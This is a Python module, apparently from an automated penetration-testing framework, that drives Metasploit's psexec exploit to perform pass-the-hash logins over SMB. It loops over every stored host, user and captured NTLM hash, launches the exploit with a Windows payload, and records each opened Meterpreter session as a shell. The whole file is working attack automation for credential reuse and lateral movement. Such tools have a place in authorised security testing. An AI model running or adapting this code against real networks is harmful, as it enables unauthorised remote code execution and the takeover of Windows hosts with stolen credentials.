import re

from core.keystore import KeyStore
from core.msfActionModule import MsfActionModule


class exploit_msf_psexec_pth(MsfActionModule):
    def __init__(self, config, display, lock):
        super(exploit_msf_psexec_pth, self).__init__(config, display, lock)
        self.title = "Attempt to authenticate via PSEXEC PTH"
        self.shortName = "MSFpsexec"
        self.description = "execute [use exploit/windows/smb/psexec] on each target"

        self.requirements = ["msfconsole"]
        self.triggers = ["newNTLMHash"]
        self.types = ["passwords"]

        self.safeLevel = 4

    def getTargets(self):
        # we are interested only in the hosts that had null sessions
        self.targets = KeyStore.get('host')

    def process(self):
        # load any targets we are interested in
        self.getTargets()

        if len(self.targets) > 0:
            # loop over each target
            for t in self.targets:
                users = self.getUsers(t)
                for user in users:
                    hashes = KeyStore.get(f"creds/host/{t}/username/{user}/fullhash")
                    for passhash in hashes:
                        # verify we have not tested this host before
                        if not self.seentarget(t + user + passhash):
                            # add the new IP to the already seen list
                            self.addseentarget(t + user + passhash)

                            cmd = {'config': ["use exploit/windows/smb/psexec", "set RPORT 445", f"set RHOST {t}",
                                              f"set SMBUser {user}", f"set SMBPass {passhash}"], 'payload': 'win'}

                            result, outfile = self.execute_msf(t, cmd)

                            parts = re.findall(r".*Meterpreter session (\d+) opened.*", result)
                            for part in parts:
                                self.fire("msfSession")
                                self.display.verbose(f"NEW session on : {t}")
                                KeyStore.add(f"shell/{t}/msf/{str(part)}")

        return
